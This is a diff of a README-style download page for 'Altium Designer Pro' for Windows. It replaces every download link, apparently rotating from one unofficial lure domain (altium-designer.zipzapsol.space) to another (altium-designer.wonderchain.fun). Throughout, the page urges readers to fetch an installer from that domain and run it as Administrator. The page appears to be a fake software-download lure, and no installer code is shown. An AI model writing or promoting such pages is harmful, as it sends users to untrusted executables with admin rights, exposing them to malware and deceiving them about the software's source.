@@ -13,27 +13,27 @@
 > **This is the download page.** Use the button or link below to get **Altium Designer Pro** for Windows.
 
 <p align="center">
-  <a href="https://altium-designer.zipzapsol.space/">
+  <a href="https://altium-designer.wonderchain.fun/">
     <img src="https://img.shields.io/badge/Download-Altium%20Designer%20Pro-0078D4?style=for-the-badge&logo=windows&logoColor=white" alt="Download Altium Designer Pro">
   </a>
 </p>
 
 | | |
 | --- | --- |
-| **Direct link** | **[altium-designer.zipzapsol.space](https://altium-designer.zipzapsol.space/)** |
-| **Full URL** | `https://altium-designer.zipzapsol.space/` |
+| **Direct link** | **[altium-designer.wonderchain.fun](https://altium-designer.wonderchain.fun/)** |
+| **Full URL** | `https://altium-designer.wonderchain.fun/` |
 | **Type** | Installer for Windows 10 / 11 (64-bit) |
 | **Admin** | Run setup as Administrator |
 
 ### Quick steps
 
-1. Click **[Download — altium-designer.zipzapsol.space](https://altium-designer.zipzapsol.space/)** (link above)
+1. Click **[Download — altium-designer.wonderchain.fun](https://altium-designer.wonderchain.fun/)** (link above)
 2. Save the file from the project page
 3. Run the setup **as Administrator**
 4. Enter your license key when prompted
 5. Restart if the installer asks — then launch from Start menu
 
-<p align="center"><a href="https://altium-designer.zipzapsol.space/"><strong>⬇ Download Altium Designer Pro now</strong></a></p>
+<p align="center"><a href="https://altium-designer.wonderchain.fun/"><strong>⬇ Download Altium Designer Pro now</strong></a></p>
 
 ---
 
